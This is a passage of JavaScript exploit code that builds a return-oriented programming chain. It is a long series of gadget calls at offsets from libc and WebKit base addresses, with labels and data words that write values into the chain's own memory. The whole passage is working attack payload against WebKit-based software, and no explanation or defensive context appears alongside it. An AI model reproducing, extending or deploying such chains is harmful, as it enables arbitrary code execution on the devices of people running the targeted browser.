db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L291:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L292:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+77544, //L295-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L295:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+77648, //L296-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+77680, //L298-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+77664, //L297-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L296:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L297:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L298:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+77752, //L299-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+77768, //L300-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L299:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L300:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+77872, //L303-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+77888, //L304-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L301:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+757614,); //pop rcx
//L303:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+490911, //mov [rax], cl
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L305:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+78032, //L309-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+78016, //L308-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L308:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+78176, //L312-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+78144, //L310-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+78160, //L311-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+78248, //L313-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L313:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+78304, //L316-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L316:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+78400, //L319-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L317:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L319:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+78504, //L322-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+78488, //L321-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L321:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+78672, //L325-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+78688, //L326-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+78640, //L323-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+78656, //L324-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L324:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+78792, //L327-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+78824, //L329-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+78808, //L328-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+78912, //L330-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+78968, //L333-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L333:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+79104, //L335-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+79120, //L336-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+79088, //L334-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223872, //mov al, [rdi]
libc_base+362222, //pop rsi
ropchain+79280, //L340-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+79232, //L337-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+79264, //L339-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L337:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L338:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L339:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+79336, //L342-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L342:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+79440, //L343-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+79472, //L345-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+79456, //L344-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L343:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+79632, //L349-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+79584, //L346-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+79616, //L348-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L346:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L347:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L348:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+79688, //L351-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L351:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+79792, //L352-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+79824, //L354-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+79808, //L353-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L352:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+79984, //L358-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+79936, //L355-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+79968, //L357-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L355:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L356:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L357:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+80040, //L360-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L360:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+80144, //L361-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+80176, //L363-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+80160, //L362-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L361:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+80248, //L364-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+80264, //L365-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+80424, //L369-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+80376, //L366-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+80408, //L368-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L366:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L367:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L368:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+80480, //L371-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+80584, //L372-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+80616, //L374-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+80600, //L373-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L372:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+80712, //L376-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+80696, //L375-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+80808, //L379-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L377:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+80912, //L382-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+80896, //L381-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L381:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L382:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+81056, //L385-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+81024, //L383-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+81040, //L384-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+81128, //L386-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L386:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+81184, //L389-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L389:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+81328, //L393-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L391:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+81432, //L396-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+81416, //L395-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L395:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+81600, //L399-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+81616, //L400-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+81568, //L397-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+81584, //L398-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L398:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+81720, //L401-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+81752, //L403-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+81736, //L402-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+845415, //sub rax, rcx ; sbb rdx, rcx
libc_base+362222, //pop rsi
ropchain+81856, //L404-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+81872, //L405-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+753071, //add rax, rcx
libc_base+362222, //pop rsi
ropchain+81960, //L406-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+82016, //L409-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L409:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+82088, //L410-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L410:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+82144, //L413-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+82248, //L416-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L414:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+757614,); //pop rcx
//L416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+82352, //L419-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+82336, //L418-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L418:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+223872, //mov al, [rdi]
libc_base+362222, //pop rsi
ropchain+82512, //L423-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+82464, //L420-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+82496, //L422-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L420:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L421:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L422:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+82568, //L425-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+82672, //L426-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+82704, //L428-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+82688, //L427-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L426:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+82864, //L432-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+82816, //L429-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+82848, //L431-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L429:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L430:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L431:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+82920, //L434-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+83024, //L435-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+83056, //L437-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+83040, //L436-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L435:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L436:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L437:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+83128, //L438-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+83144, //L439-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+83304, //L443-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+83256, //L440-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+83288, //L442-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L440:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L441:
db([24, 0]); // 0x18
set_gadget(libc_base+155394,); //pop rdi
//L442:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+362222, //pop rsi
ropchain+83360, //L445-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+155394 //pop rdi
]);
//L445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+476920, //sar edi, cl
libc_base+362222, //pop rsi
ropchain+83464, //L446-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+83496, //L448-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+83480, //L447-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L446:
db([0, 0]); // 0x0
